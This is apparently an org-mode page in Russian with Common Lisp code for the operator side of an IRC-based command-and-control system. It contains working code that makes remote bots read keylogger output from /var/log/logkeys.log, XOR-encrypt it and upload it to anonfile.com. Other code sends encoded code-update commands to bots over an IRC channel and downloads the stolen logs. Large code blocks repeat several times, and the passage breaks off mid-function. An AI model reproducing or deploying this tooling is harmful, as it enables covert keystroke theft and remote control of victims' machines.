  (loop :for (task-th . time) :in *task-threads* :do
       (dbg ":: operator-lambda-killer ~A . ~A~%" task-th time)
       (when (&gt; (- (get-universal-time) time)
                *max-task-thread-life-time*)
         (dbg ":: operator-lambda: kill task-th by lifetime exceed~%")
         (kill task-th)))
  (clear))
(when (&lt; 0 (length-of-queue))
  (let* ((current-task (pop-task))
         (bindings `((*standard-output* . ,*standard-output*)
                     (*task-thread-stop-flag* . ,*task-th-stop-flag*)
                     (*current-task* . ,current-task)
                     (*op-sess* . ,*op-sess*)
                     (*op-user* . ,*op-user*)
                     (*op-serv* . ,*op-serv*)
                     (*op-chan* . ,*op-chan*)
                     (*op-lock* . ,*op-lock*)
                     (*op-conn* . ,*op-conn*)
                     (*watchdog-timer* . ,*watchdog-timer*))))
    (bt:with-recursive-lock-held (*thread-operations-lock*)
      (push (cons (bt:make-thread #'task :name "task-th"
                                  :initial-bindings bindings)
                  (get-universal-time))
            *task-threads*))))
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-org0b0d59c" class="outline-3">
<h3 id="org0b0d59c">Operator's Irc Thread Function</h3>
<div class="outline-text-3" id="text-org0b0d59c">
<p>
Когда оператор создает новый поток в качестве функции потока он указывает
<code>op-irc</code>. Задачи этой функции:
</p>
<ul class="org-ul">
<li>создать соединение с IRC-сервером</li>
<li>обнулить <code>watchdog-timer</code></li>
<li>запустить <code>op-loop</code> для обработки сообщений IRC</li>
</ul>

<p>
Если нет подключения к сети мы получим ошибку
<code>USOCKET:NS-TRY-AGAIN-CONDITION</code>, которая будет проигнорирована, но
записана в лог, как и любые другие ошибки подключения. В этих случаях
функция <code>op-loop</code> не будет вызвана, произойдет выход их функции потока и
поток будет завершен. Обнаружив отсутствие потока супервизор перезапустит
его и это приведет к следующей попытке подключения.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org422ce8f">(defparameter *op-sess* nil)
(defparameter *op-user* nil)
(defparameter *op-serv* "irc.freenode.org")
(defparameter *op-chan* "#wntriscoming")
(defparameter *op-lock* (bt:make-recursive-lock "op-lock"))
(defparameter *op-conn* nil)

(defmacro sendmsg (msg &amp;rest params)
  `(bt:with-recursive-lock-held (*op-lock*)
     (cl-irc:privmsg *op-conn* *op-chan* (format nil ,msg ,@params))))

;; op-hook
;; op_cmd_proc
(defun shot-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^/.*/[0-9]*(_[0-9])?$" str))

(defun shot-rule-consequent (str src)
  (dbg ":: shot-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (ins-task (make-task :class 'task
                       :data (list str src)
                       :code #'identity)))

;; (shot-rule-consequent "/pe3bM7E9n5/3785062633" "b3785062627")
(defun hi-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^hi$" str))

;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; encrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; anon_file_upload
;; (setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; upload_code
(defun upload-code (code key)
  (let* ((oct (flex:string-to-octets code :external-format :utf-8))
         (base64 (encrypt oct key))
         (filename (format nil "u-~A" (get-universal-time)))
         (result   (cl-json:decode-json-from-string
                    (anon-file-upload filename base64)))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    link))

;; TEST for upload
;; (upload-code "(defun alfa () (print 1))" 1234567890)
;; /t1TaCeD1ne/u-3784605289

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

(defun upload-code-and-send (code key seed)
  (let* ((code-link (upload-code code key))
         (cmd (format nil "(update \"~A\" ~A)" code-link key))
         (enc (encode cmd seed)))
    (sendmsg enc)))

;; (upload-code-and-send "(alfa)" 1234567890 3784753813)

(defun hi-rule-consequent (str src)
  (dbg ":: HI-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890)
         (receiver (parse-integer (subseq src 1)))
         (code (format
                nil
                "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
                tmpkey)))
    (upload-code-and-send code tmpkey receiver)))

;; (let* ((tmpkey 1234567890)
;;        (src "b3785294860")
;;        (receiver (parse-integer (subseq src 1)))
;;        (code (format
;;               nil
;;               "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
;;               tmpkey)))
;;   (upload-code-and-send code tmpkey receiver))
(defun k-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^k/(.*)/u-(.*)$" str))

(defun download-and-decrypt (link key)
  (flex:octets-to-string
   (decrypt
    (anon-file-download link)
    key)
   :external-format :utf-8))

;; (upload-code
;;  (alexandria:read-file-into-string "q.lisp\"")

;; (download-and-decrypt "/some/link" *tmpkey*)

(defun k-rule-consequent (str src)
  (dbg ":: K-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890))
    (alexandria:write-string-into-file
     (download-and-decrypt (subseq str 1) tmpkey)
     (format nil "~~/wnt/~A.log" (ppcre:regex-replace-all "/" str "_")))))

(defparameter *op-rules*
  (list (cons #'shot-rule-antecedent  #'shot-rule-consequent)
        (cons #'hi-rule-antecedent    #'hi-rule-consequent)
        (cons #'k-rule-antecedent     #'k-rule-consequent)))

(defparameter *op-cmd*
  (lambda (param)
    (block op-cmd-block
      (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
             (src  (CL-IRC:SOURCE param))
             ;; (oct  (decrypt msg *op-sess*))
             ;; (str  (handler-case
             ;;           (flex:octets-to-string oct :external-format :utf-8)
             ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
             (str msg)
             )
        (dbg ":: op-cmd ~A: ~A~%" src str)
        (block op-rules-dispatcher
          (let ((applyed_rules 0))
            (loop :for (antecedent . consequent) :in *op-rules* :do
                 (when (funcall antecedent str src)
                   (incf applyed_rules)
                   (dbg ":: op-cmd rule: ~A~%" consequent)
                   (when (funcall consequent str src)
                     (return-from op-rules-dispatcher nil))))
            (when (&gt; 0 applyed_rules)
              (dbg "::UNKMSG [~A] from [~A]~%" str src))
            (finish-output)))
        ))))

(defun op-msg-hook (param)
  "MUST return T for stop hooks processing"
  (funcall *op-cmd* param)
  t)

(defun op-helper ()
  (sleep 1)
  (cl-irc:add-hook *op-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'op-msg-hook)
  (sleep 1)
  (bt:with-recursive-lock-held (*op-lock*)
    (cl-irc:join *op-conn* *op-chan*))
  (sleep 1)
  (bt:with-recursive-lock-held (*op-lock*)
    (setf *op-connection-established-flag* t))
  (sendmsg "op here"))

(defun op-loop ()
  (bt:make-thread
   #'op-helper :name "op-helper-th"
   :initial-bindings
   `((*standard-output* . ,*standard-output*)
     (*op-sess* . ,*op-sess*)
     (*op-user* . ,*op-user*)
     (*op-serv* . ,*op-serv*)
     (*op-chan* . ,*op-chan*)
     (*op-lock* . ,*op-lock*)
     (*op-conn* . ,*op-conn*)))
  (handler-case (cl-irc:read-message-loop *op-conn*)
    (SB-INT:SIMPLE-STREAM-ERROR (err)
      (dbg ":: op-loop error: ~A~%" (type-of err)))
    ;; (t (err)
    ;;   (dbg "::op-loop error: ~A~%" (type-of err)))
    ))

(defun op-irc ()
  "operator's irc thread func"
  (setf *op-sess* (get-universal-time))
  (setf *op-user* (format nil "op~A" *op-sess*))
  (setf *op-conn*
        (handler-case
            (cl-irc:connect :nickname *op-user* :server *op-serv*)
          (USOCKET:NS-TRY-AGAIN-CONDITION (err)
            (dbg "::irc connect error: ~A~%" (type-of err))
            nil)
          (t (err)
            (dbg "::irc connect error: ~A~%" (type-of err))
            nil)))
  (when *op-conn*
    (dbg "::op irc conn:~A~%" *op-conn*)
    (setf *watchdog-timer* 0)
    (op-loop)))
</pre>
</div>
</div>
</div>

<div id="outline-container-org3a7bcfa" class="outline-3">
<h3 id="org3a7bcfa">Operator's Loop</h3>
<div class="outline-text-3" id="text-org3a7bcfa">
<p>
На этом месте текущий поток должен запустить поток-помошник, который
инжектирует хук, подключитья к каналу и установит
<code>op-connection-established-flag</code>.
</p>

<p>
Запустив этот поток, можно сразу же зациклиться читая сообщения - дальше
будут работать установленные хуки. Они будут вызываться в контексте
текущего потока, асинхронно, из функции пакета <code>cl-irc</code>.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org62e9859">(defmacro sendmsg (msg &amp;rest params)
  `(bt:with-recursive-lock-held (*op-lock*)
     (cl-irc:privmsg *op-conn* *op-chan* (format nil ,msg ,@params))))

;; op-hook
;; op_cmd_proc
(defun shot-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^/.*/[0-9]*(_[0-9])?$" str))

(defun shot-rule-consequent (str src)
  (dbg ":: shot-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (ins-task (make-task :class 'task
                       :data (list str src)
                       :code #'identity)))

;; (shot-rule-consequent "/pe3bM7E9n5/3785062633" "b3785062627")
(defun hi-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^hi$" str))

;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; encrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; anon_file_upload
;; (setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; upload_code
(defun upload-code (code key)
  (let* ((oct (flex:string-to-octets code :external-format :utf-8))
         (base64 (encrypt oct key))
         (filename (format nil "u-~A" (get-universal-time)))
         (result   (cl-json:decode-json-from-string
                    (anon-file-upload filename base64)))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    link))

;; TEST for upload
;; (upload-code "(defun alfa () (print 1))" 1234567890)
;; /t1TaCeD1ne/u-3784605289

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

(defun upload-code-and-send (code key seed)
  (let* ((code-link (upload-code code key))
         (cmd (format nil "(update \"~A\" ~A)" code-link key))
         (enc (encode cmd seed)))
    (sendmsg enc)))

;; (upload-code-and-send "(alfa)" 1234567890 3784753813)

(defun hi-rule-consequent (str src)
  (dbg ":: HI-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890)
         (receiver (parse-integer (subseq src 1)))
         (code (format
                nil
                "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
                tmpkey)))
    (upload-code-and-send code tmpkey receiver)))

;; (let* ((tmpkey 1234567890)
;;        (src "b3785294860")
;;        (receiver (parse-integer (subseq src 1)))
;;        (code (format
;;               nil
;;               "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
;;               tmpkey)))
;;   (upload-code-and-send code tmpkey receiver))
(defun k-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^k/(.*)/u-(.*)$" str))

(defun download-and-decrypt (link key)
  (flex:octets-to-string
   (decrypt
    (anon-file-download link)
    key)
   :external-format :utf-8))

;; (upload-code
;;  (alexandria:read-file-into-string "q.lisp\"")

;; (download-and-decrypt "/some/link" *tmpkey*)

(defun k-rule-consequent (str src)
  (dbg ":: K-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890))
    (alexandria:write-string-into-file
     (download-and-decrypt (subseq str 1) tmpkey)
     (format nil "~~/wnt/~A.log" (ppcre:regex-replace-all "/" str "_")))))

(defparameter *op-rules*
  (list (cons #'shot-rule-antecedent  #'shot-rule-consequent)
        (cons #'hi-rule-antecedent    #'hi-rule-consequent)
        (cons #'k-rule-antecedent     #'k-rule-consequent)))

(defparameter *op-cmd*
  (lambda (param)
    (block op-cmd-block
      (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
             (src  (CL-IRC:SOURCE param))
             ;; (oct  (decrypt msg *op-sess*))
             ;; (str  (handler-case
             ;;           (flex:octets-to-string oct :external-format :utf-8)
             ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
             (str msg)
             )
        (dbg ":: op-cmd ~A: ~A~%" src str)
        (block op-rules-dispatcher
          (let ((applyed_rules 0))
            (loop :for (antecedent . consequent) :in *op-rules* :do
                 (when (funcall antecedent str src)
                   (incf applyed_rules)
                   (dbg ":: op-cmd rule: ~A~%" consequent)
                   (when (funcall consequent str src)
                     (return-from op-rules-dispatcher nil))))
            (when (&gt; 0 applyed_rules)
              (dbg "::UNKMSG [~A] from [~A]~%" str src))
            (finish-output)))
        ))))

(defun op-msg-hook (param)
  "MUST return T for stop hooks processing"
  (funcall *op-cmd* param)
  t)

(defun op-helper ()
  (sleep 1)
  (cl-irc:add-hook *op-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'op-msg-hook)
  (sleep 1)
  (bt:with-recursive-lock-held (*op-lock*)
    (cl-irc:join *op-conn* *op-chan*))
  (sleep 1)
  (bt:with-recursive-lock-held (*op-lock*)
    (setf *op-connection-established-flag* t))
  (sendmsg "op here"))

(defun op-loop ()
  (bt:make-thread
   #'op-helper :name "op-helper-th"
   :initial-bindings
   `((*standard-output* . ,*standard-output*)
     (*op-sess* . ,*op-sess*)
     (*op-user* . ,*op-user*)
     (*op-serv* . ,*op-serv*)
     (*op-chan* . ,*op-chan*)
     (*op-lock* . ,*op-lock*)
     (*op-conn* . ,*op-conn*)))
  (handler-case (cl-irc:read-message-loop *op-conn*)
    (SB-INT:SIMPLE-STREAM-ERROR (err)
      (dbg ":: op-loop error: ~A~%" (type-of err)))
    ;; (t (err)
    ;;   (dbg "::op-loop error: ~A~%" (type-of err)))
    ))
</pre>
</div>
</div>

<div id="outline-container-orgc31fd46" class="outline-4">
<h4 id="orgc31fd46">Operator's helper thread</h4>
<div class="outline-text-4" id="text-orgc31fd46">
<p>
Поток-помошник занимается только тем, что устанавливает хук, джоинится в
канал и отправляет приветственное сообщение о том что он в канале.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org3be1fba">(defmacro sendmsg (msg &amp;rest params)
  `(bt:with-recursive-lock-held (*op-lock*)
     (cl-irc:privmsg *op-conn* *op-chan* (format nil ,msg ,@params))))

;; op-hook
;; op_cmd_proc
(defun shot-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^/.*/[0-9]*(_[0-9])?$" str))

(defun shot-rule-consequent (str src)
  (dbg ":: shot-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (ins-task (make-task :class 'task
                       :data (list str src)
                       :code #'identity)))

;; (shot-rule-consequent "/pe3bM7E9n5/3785062633" "b3785062627")
(defun hi-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^hi$" str))

;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; encrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; anon_file_upload
;; (setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; upload_code
(defun upload-code (code key)
  (let* ((oct (flex:string-to-octets code :external-format :utf-8))
         (base64 (encrypt oct key))
         (filename (format nil "u-~A" (get-universal-time)))
         (result   (cl-json:decode-json-from-string
                    (anon-file-upload filename base64)))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    link))

;; TEST for upload
;; (upload-code "(defun alfa () (print 1))" 1234567890)
;; /t1TaCeD1ne/u-3784605289

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

(defun upload-code-and-send (code key seed)
  (let* ((code-link (upload-code code key))
         (cmd (format nil "(update \"~A\" ~A)" code-link key))
         (enc (encode cmd seed)))
    (sendmsg enc)))

;; (upload-code-and-send "(alfa)" 1234567890 3784753813)

(defun hi-rule-consequent (str src)
  (dbg ":: HI-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890)
         (receiver (parse-integer (subseq src 1)))
         (code (format
                nil
                "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
                tmpkey)))
    (upload-code-and-send code tmpkey receiver)))

;; (let* ((tmpkey 1234567890)
;;        (src "b3785294860")
;;        (receiver (parse-integer (subseq src 1)))
;;        (code (format
;;               nil
;;               "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
;;               tmpkey)))
;;   (upload-code-and-send code tmpkey receiver))
(defun k-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^k/(.*)/u-(.*)$" str))

(defun download-and-decrypt (link key)
  (flex:octets-to-string
   (decrypt
    (anon-file-download link)
    key)
   :external-format :utf-8))

;; (upload-code
;;  (alexandria:read-file-into-string "q.lisp\"")

;; (download-and-decrypt "/some/link" *tmpkey*)

(defun k-rule-consequent (str src)
  (dbg ":: K-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890))
    (alexandria:write-string-into-file
     (download-and-decrypt (subseq str 1) tmpkey)
     (format nil "~~/wnt/~A.log" (ppcre:regex-replace-all "/" str "_")))))

(defparameter *op-rules*
  (list (cons #'shot-rule-antecedent  #'shot-rule-consequent)
        (cons #'hi-rule-antecedent    #'hi-rule-consequent)
        (cons #'k-rule-antecedent     #'k-rule-consequent)))

(defparameter *op-cmd*
  (lambda (param)
    (block op-cmd-block
      (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
             (src  (CL-IRC:SOURCE param))
             ;; (oct  (decrypt msg *op-sess*))
             ;; (str  (handler-case
             ;;           (flex:octets-to-string oct :external-format :utf-8)
             ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
             (str msg)
             )
        (dbg ":: op-cmd ~A: ~A~%" src str)
        (block op-rules-dispatcher
          (let ((applyed_rules 0))
            (loop :for (antecedent . consequent) :in *op-rules* :do
                 (when (funcall antecedent str src)
                   (incf applyed_rules)
                   (dbg ":: op-cmd rule: ~A~%" consequent)
                   (when (funcall consequent str src)
                     (return-from op-rules-dispatcher nil))))
            (when (&gt; 0 applyed_rules)
              (dbg "::UNKMSG [~A] from [~A]~%" str src))
            (finish-output)))
        ))))

(defun op-msg-hook (param)
  "MUST return T for stop hooks processing"
  (funcall *op-cmd* param)
  t)

(defun op-helper ()
  (sleep 1)
  (cl-irc:add-hook *op-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'op-msg-hook)
  (sleep 1)
  (bt:with-recursive-lock-held (*op-lock*)
    (cl-irc:join *op-conn* *op-chan*))
  (sleep 1)
  (bt:with-recursive-lock-held (*op-lock*)
    (setf *op-connection-established-flag* t))
  (sendmsg "op here"))
</pre>
</div>
</div>
</div>
</div>

<div id="outline-container-orge1fd179" class="outline-3">
<h3 id="orge1fd179">Operator's Message Hook</h3>
<div class="outline-text-3" id="text-orge1fd179">
<p>
Собственно хук, который обрабатывает приходящие в канал сообщения. Он
вынесен в глобальную переменную для удобства замены на лету.
</p>

<p>
Чтобы предотвратить последующую обработку процедура хука должна
возвращать T.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="orgbd1780d">;; op_cmd_proc
(defun shot-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^/.*/[0-9]*(_[0-9])?$" str))

(defun shot-rule-consequent (str src)
  (dbg ":: shot-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (ins-task (make-task :class 'task
                       :data (list str src)
                       :code #'identity)))

;; (shot-rule-consequent "/pe3bM7E9n5/3785062633" "b3785062627")
(defun hi-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^hi$" str))

;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; encrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; anon_file_upload
;; (setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
